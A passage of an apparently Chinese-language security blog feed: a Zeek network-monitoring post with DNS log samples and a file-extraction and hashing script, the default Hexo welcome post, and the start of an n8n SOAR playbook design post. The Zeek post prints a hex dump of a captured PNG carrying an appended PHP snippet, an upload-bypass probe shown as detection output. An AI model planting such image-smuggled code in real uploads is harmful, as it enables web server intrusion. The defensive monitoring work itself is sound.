class="string">&quot;udp&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;trans_id&quot;</span>: <span class="number">696</span>,</span><br><span class="line">  <span class="attr">&quot;rtt&quot;</span>: <span class="number">1.3113021850585938e-05</span>,</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: <span class="string">&quot;graph.facebook.com&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;qclass&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;qclass_name&quot;</span>: <span class="string">&quot;C_INTERNET&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;qtype&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;qtype_name&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;rcode&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;rcode_name&quot;</span>: <span class="string">&quot;NOERROR&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;AA&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;TC&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;RD&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;RA&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;Z&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;answers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;api.facebook.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;star.c10r.facebook.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;157.240.22.19&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;TTLs&quot;</span>: [</span><br><span class="line">    <span class="number">540</span>,</span><br><span class="line">    <span class="number">770</span>,</span><br><span class="line">    <span class="number">54</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rejected&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;dns&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>当采用Zeek过滤了DNS请求后，现在每天的DNS数据量 <strong>6,300,000/天 ~ 6,800,000/天</strong>（query + answer），对比之前的数据量<strong>320,000,000/天 ~ 350,000,000/天</strong>（query）。数据量减少很明显，同时也减少了后端ES存储的压力。</p>
<ul>
<li>Zeek DNS （query + answer）</li>
</ul>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Zeek-DNS-1.png" alt="image-20200511135508651"></p>
<ul>
<li>Suricata DNS （query）</li>
</ul>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Suricata-DNS-1.png" alt="image-20200511140015791"></p>
<hr>
<h5 id="2-更灵活的文件还原与提取文件HASH"><a href="#2-更灵活的文件还原与提取文件HASH" class="headerlink" title="2. 更灵活的文件还原与提取文件HASH"></a>2. 更灵活的文件还原与提取文件HASH</h5><h6 id="文件还原脚本"><a href="#文件还原脚本" class="headerlink" title="文件还原脚本"></a>文件还原脚本</h6><p><strong>file_extraction.zeek</strong> </p>
<p><strong>Demo脚本，语法并不是很优雅，切勿纠结。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@load base/frameworks/files/main</span><br><span class="line">@load base/protocols/http/main</span><br><span class="line"></span><br><span class="line">module Files;</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> &#123;</span><br><span class="line">    redef record Info += &#123;</span><br><span class="line">        hostname:         string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        proxied:          <span class="built_in">set</span>[string] &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        url:              string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        method:           string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        true_client_ip:   string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        logs:             bool &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    option http_info = T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">redef FileExtract::prefix = <span class="string">&quot;/data/logs/zeek/extracted_files/&quot;</span>;</span><br><span class="line"></span><br><span class="line">global mime_to_ext: table[string] of string = &#123;</span><br><span class="line">    [<span class="string">&quot;text/plain&quot;</span>] = <span class="string">&quot;txt&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>] = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-dosexec&quot;</span>] = <span class="string">&quot;exe&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>] = <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;image/png&quot;</span>] = <span class="string">&quot;png&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/pdf&quot;</span>] = <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/java-archive&quot;</span>] = <span class="string">&quot;jar&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-java-applet&quot;</span>] = <span class="string">&quot;jar&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-java-jnlp-file&quot;</span>] = <span class="string">&quot;jnlp&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/msword&quot;</span>] = <span class="string">&quot;doc&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;</span>] = <span class="string">&quot;docs&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>] = <span class="string">&quot;xlsx&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;</span>] = <span class="string">&quot;pptx&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global file_analyzer: table[string] of bool = &#123;</span><br><span class="line">    [<span class="string">&quot;Extraction&quot;</span>] = T,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_method: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">    <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">    <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_hostname: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">  <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">global http_uri: <span class="built_in">set</span>[string] = &#123;</span><br><span class="line">  <span class="string">&quot;/index.php&quot;</span>,</span><br><span class="line">  <span class="string">&quot;/account.php&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> files_filter(rec: Files::Info): bool</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">return</span> rec?<span class="variable">$logs</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">event <span class="function"><span class="title">zeek_init</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">    Log::remove_default_filter(Files::LOG);</span><br><span class="line">    <span class="built_in">local</span> filter: Log::Filter = [<span class="variable">$name</span>=<span class="string">&quot;file_extraction&quot;</span>, <span class="variable">$path</span>=<span class="string">&quot;/data/logs/zeek/file_extraction&quot;</span>, <span class="variable">$pred</span>=files_filter];</span><br><span class="line">    Log::add_filter(Files::LOG, filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">event file_sniff(f: fa_file, meta: fa_metadata) &amp;priority=3</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> ( f<span class="variable">$source</span> != <span class="string">&quot;HTTP&quot;</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! f<span class="variable">$http</span>?<span class="variable">$method</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( f$http<span class="variable">$method</span> !<span class="keyword">in</span> http_method )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! f<span class="variable">$http</span>?<span class="variable">$host</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( f$http<span class="variable">$host</span> !<span class="keyword">in</span> http_hostname )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! meta?<span class="variable">$mime_type</span> )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( meta<span class="variable">$mime_type</span> !<span class="keyword">in</span> mime_to_ext )</span><br><span class="line">        <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">    f$info<span class="variable">$logs</span> = T;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( file_analyzer[<span class="string">&quot;Extraction&quot;</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">local</span> fname = fmt(<span class="string">&quot;%s-%s.%s&quot;</span>, f<span class="variable">$source</span>, f<span class="variable">$id</span>, mime_to_ext[meta<span class="variable">$mime_type</span>]);</span><br><span class="line">        Files::add_analyzer(f, Files::ANALYZER_EXTRACT, [<span class="variable">$extract_filename</span>=fname]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    Files::add_analyzer(f, Files::ANALYZER_MD5);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( http_info )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$host</span> )</span><br><span class="line">            f$info<span class="variable">$hostname</span> = f$http<span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$proxied</span> )</span><br><span class="line">            f$info<span class="variable">$proxied</span> = f$http<span class="variable">$proxied</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$method</span> )</span><br><span class="line">            f$info<span class="variable">$method</span> = f$http<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$uri</span> )</span><br><span class="line">            f$info<span class="variable">$url</span> = f$http<span class="variable">$uri</span>;</span><br><span class="line">        <span class="keyword">if</span> ( f<span class="variable">$http</span>?<span class="variable">$true_client_ip</span> )</span><br><span class="line">            f$info<span class="variable">$true_client_ip</span> = f$http<span class="variable">$true_client_ip</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtract::prefix == <span class="string">&quot;&quot;</span> || !f<span class="variable">$info</span>?<span class="variable">$logs</span> )</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">        <span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">        <span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line">        <span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">        <span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">        <span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtract::prefix, ndate);</span><br><span class="line">        mkdir(dest_dir);</span><br><span class="line">        <span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s.%s&quot;</span>, dest_dir, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line">        <span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s/%s %s&quot;</span>, FileExtract::prefix, orig, dest);</span><br><span class="line">        when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h6 id="脚本简述：-1"><a href="#脚本简述：-1" class="headerlink" title="脚本简述："></a>脚本简述：</h6><pre><code> 1. 支持针对指定hostname，method，url，文件头进行hash的提取以及文件还原；
 2. 默认文件还原按照年月日进行数据的存储，保存名字按照MD5名称命名；
 3. 丰富化了文件还原的日志，增加HTTP相关字段；
</code></pre>
<h6 id="日志样例"><a href="#日志样例" class="headerlink" title="日志样例"></a>日志样例</h6><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1588891497.173108</span>,</span><br><span class="line">  <span class="attr">&quot;fuid&quot;</span>: <span class="string">&quot;FhOGNc2zDdlF3AP5c&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;conn_uids&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;CItQs61wvvtPqSB0Ub&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;depth&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;analyzers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;MD5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SHA1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EXTRACT&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;mime_type&quot;</span>: <span class="string">&quot;image/png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;duration&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;local_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;is_orig&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;seen_bytes&quot;</span>: <span class="number">353</span>,</span><br><span class="line">  <span class="attr">&quot;total_bytes&quot;</span>: <span class="number">353</span>,</span><br><span class="line">  <span class="attr">&quot;missing_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;overflow_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;timedout&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;md5&quot;</span>: <span class="string">&quot;fd0229d400049449084b3864359c445a&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;sha1&quot;</span>: <span class="string">&quot;d836d3f06c0fc075cf0f5d95f50b79cac1dac97d&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted&quot;</span>: <span class="string">&quot;/data/logs/zeek/extracted_files/2020-05-07/fd0229d400049449084b3864359c445a.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted_cutoff&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxied&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;TRUE-CLIENT-IP -&gt; 3.3.3.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-FORWARDED-FOR -&gt; 4.4.4.4&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/image/close.png&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;true_client_ip&quot;</span>: <span class="string">&quot;3.3.3.3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;logs&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="文件还原"><a href="#文件还原" class="headerlink" title="文件还原"></a>文件还原</h6><p><strong>这是其中一个包含恶意Payload还原出的图片样例</strong></p>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Payload-pic.png" alt="image-20200511150738194"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ll /data/logs/zeek/extracted_files/</span><br><span class="line">total 89916</span><br><span class="line">drwxr-xr-x 10 root root      150 May 11 06:14 ./</span><br><span class="line">drwxr-xr-x  4 root root       67 May 11 06:00 ../</span><br><span class="line">drwxr-xr-x  2 root root       50 May  5 07:54 2020-05-04/</span><br><span class="line">drwxr-xr-x  2 root root     4096 May  5 23:51 2020-05-05/</span><br><span class="line">drwxr-xr-x  2 root root   671744 May  6 23:41 2020-05-06/</span><br><span class="line">drwxr-xr-x  2 root root     4096 May  7 22:44 2020-05-07/</span><br><span class="line">drwxr-xr-x  2 root root   741376 May  8 23:59 2020-05-08/</span><br><span class="line">drwxr-xr-x  2 root root 23425024 May  9 23:59 2020-05-09/</span><br><span class="line">drwxr-xr-x  2 root root 25047040 May 10 23:59 2020-05-10/</span><br><span class="line">drwxr-xr-x  2 root root 24846336 May 11 06:14 2020-05-11/</span><br><span class="line"></span><br><span class="line">$ xxd /data/logs/zeek/extracted_files/2020-05-07/884d9474180e5b49f851643cb2442bce.jpg</span><br><span class="line">00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR</span><br><span class="line">00000010: 0000 003c 0000 003c 0806 0000 003a fcd9  ...&lt;...&lt;.....:..</span><br><span class="line">00000020: 7200 0000 1974 4558 7453 6f66 7477 6172  r....tEXtSoftwar</span><br><span class="line">00000030: 6500 4164 6f62 6520 496d 6167 6552 6561  e.Adobe ImageRea</span><br><span class="line">00000040: 6479 71c9 653c 0000 0320 6954 5874 584d  dyq.e&lt;... iTXtXM</span><br><span class="line">00000050: 4c3a 636f 6d2e 6164 6f62 652e 786d 7000  L:com.adobe.xmp.</span><br><span class="line">..........</span><br><span class="line">00001030: 8916 ce5f 7480 2f38 c073 69f1 5c14 83fb  ..._t./8.si.\...</span><br><span class="line">00001040: aa9d 42a3 8f4b ff05 e012 e04b 802f 01be  ..B..K.....K./..</span><br><span class="line">00001050: 04b8 91c7 ff04 1800 bcae 819f d1da 1896  ................</span><br><span class="line">00001060: 0000 0000 4945 4e44 ae42 6082 3c3f 7068  ....IEND.B`.&lt;?ph</span><br><span class="line">00001070: 7020 7068 7069 6e66 6f28 293b 3f3e 1a    p phpinfo();?&gt;.</span><br></pre></td></tr></table></figure>

<h6 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h6><p>通过Zeek脚本扩展后，可以<strong>“随意所欲”</strong>的获取各种类型文件的Hash以及定制化的进行文件还原。</p>
<h4 id="头脑风暴"><a href="#头脑风暴" class="headerlink" title="头脑风暴"></a>头脑风暴</h4><p>当获取文件上传的Hash之后，可以尝试扩展出以下2个安全事件：</p>
<ol>
<li><p>判断文件是否上传成功。</p>
<p>通常第一时间会需要定位文件是否上传成功，若上传成功需要进行相关的事件输出，这个时候我们可以通过采用HIDS进行文件落地事件的关联。</p>
</li>
<li><p>关联杀毒引擎/威胁情报。</p>
<p>将第一个关联好的事件进行Hash的碰撞，最常见的是将HASH送到VT或威胁情报。</p>
</li>
</ol>
<p>这里以<strong>Wazuh</strong>事件为例，将<strong>Zeek</strong>的文件还原事件与<strong>Wazuh</strong>的新增文件事件进行关联，关联指标采用<strong>Hash</strong>。</p>
<p><strong>a. Zeek事件</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1589158812.471443</span>,</span><br><span class="line">  <span class="attr">&quot;fuid&quot;</span>: <span class="string">&quot;FBkqzM2AFg0jrioji6&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rx_hosts&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;conn_uids&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;CcOyQo2ziEuoLBNIb9&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;depth&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;analyzers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;SHA1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EXTRACT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;MD5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DATA_EVENT&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;mime_type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;duration&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;local_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;is_orig&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;seen_bytes&quot;</span>: <span class="number">31</span>,</span><br><span class="line">  <span class="attr">&quot;total_bytes&quot;</span>: <span class="number">31</span>,</span><br><span class="line">  <span class="attr">&quot;missing_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;overflow_bytes&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;timedout&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;md5&quot;</span>: <span class="string">&quot;37a74f452f1c49854a2951fd605687c5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted&quot;</span>: <span class="string">&quot;/data/logs/zeek/extracted_files/2020-05-11/37a74f452f1c49854a2951fd605687c5.txt&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;extracted_cutoff&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxied&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;X-FORWARDED-FOR -&gt; 3.3.3.3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TRUE-CLIENT-IP -&gt; 4.4.4.4&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;/index.php&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;true_client_ip&quot;</span>: <span class="string">&quot;4.4.4.4&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;logs&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>b. Wazuh 事件</strong></p>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Wazuh-Hash-1.png" alt="image-20200511144805354"></p>
]]></content>
      <categories>
        <category>NIDS</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/10/04/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>如何“优雅”的设计Playbook</title>
    <url>/2023/06/21/n8n-%E7%BC%96%E6%8E%92%E7%9A%84%E2%80%9C%E8%89%BA%E6%9C%AF%E2%80%9D/</url>
    <content><![CDATA[<h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h4><p>​    开源是“理念”，分享是“精神”。拒绝一切“对号入座”！</p>
<img src="https://img.5youqu.com/bqimg/5eef6257gy1h3z3zb2kndj20u00u00uj.jpg" alt="你要是闲着没事干 就去把村口的粪挑了" style="zoom:40%;">



<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​    之前有写过一篇Blog（<a href="https://canon88.github.io/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/">致我心中的“散装”SOAR，当Thehive遇到n8n</a>），主要是介绍如何通过Thehive + n8n形成最“简（基）陋（础）”的SOAR。本篇Blog灵感主要是来源自己平时的思考与总结。那么，让我带领你深入浅出地探索编排的“艺术”，并展示如何“优雅”的设计一个剧本。说实话，当我说出这些“骚”话的时候，我竟一点都不觉得害臊。。。</p>
<img src="https://img.soogif.com/eDyFGAzcPeRXrw8fF98FICfJs2l4XFTO.jpg" alt="img" style="zoom:100%;">

<h4 id="优雅的设计一个剧本"><a href="#优雅的设计一个剧本" class="headerlink" title="优雅的设计一个剧本"></a>优雅的设计一个剧本</h4><ol>
<li><p>设置一个<strong>Layer1</strong> Workflow，作为告警的入口。同时指定一个<strong>Layer2</strong> Workflow，作为结果的输出。这个Workflow中我的Kafka Topic是根据设备类型进行区分的，目的是便于后期进行扩展与维护。</p>
<p><img src="/2023/06/21/n8n-%E7%BC%96%E6%8E%92%E7%9A%84%E2%80%9C%E8%89%BA%E6%9C%AF%E2%80%9D/image-20230618231406229.png" alt="image-20230618231406229"></p>
<ul>
<li><p>Q：为什么选择按照设备类型进行接入？</p>
<p>A：主要是出于<strong>性能</strong>方面的考虑。试想如果你日常的告警数据量比较大，很可能会频繁“拉起”这个Workflow，其实并不是每个告警都“值得”你去跑Workflow。当然你的告警数据量不大的话，可以不用区分。在这里，我选择了按照设备类型来区分，这也方便我后续按照设备类型的不同做一些微调。</p>
</li>
<li><p>Q： 为什么不直接扩展Layer1 Workflow？</p>
<p>A：主要还是考虑到可<strong>扩展性</strong>。我个人理解的“编排”就和你写代码的思维方式差不多，你得让你的Workflow足够的健壮以及剧本一定的伸缩性。应尽量避免因为某个需求，而导致你需要对现有Workflow进行“手术”。相信我，你会很痛苦的！正因如此，我没有选择直接在Layer1进行扩展。避免出现“屎山”代码，剧本也一样如此。</p>
</li>
<li><p>Q：为什么图中Threat Intelligence用的是Webhook，而Threat Hunting是Workflow？</p>
<p>A：至于原因嘛，主要是n8n不支持在同一个Workflow中并行运行Node，且也并不是所有Node都支持异步。好在HTTP Node是支持异步的，所以，当有异步需求或者并行处理需求的时候，我们可以使用Webhook这种方式调用Workflow。算是“曲线救国”吧，不知道未来版本会不会支持。当时在社区也专门开贴讨论过，更多请戳：<a href="https://community.n8n.io/t/does-n8n-workflow-support-parallel-execution/22596">Does n8n Workflow support parallel execution?</a></p>
</li>
</ul>
<hr>
</li>
<li><p>设置一个<strong>Layer2</strong> Workflow，它用于承载Layer1的“<strong>需求</strong>”。</p>
<p><img src="/2023/06/21/n8n-%E7%BC%96%E6%8E%92%E7%9A%84%E2%80%9C%E8%89%BA%E6%9C%AF%E2%80%9D/image-20230612003234529.png" alt="image-20230612003234529"></p>
<ul>
<li><p>Q：为什么你会选择创建Threat Intelligence、Threat Hunting做为Layer2的Workflow？</p>
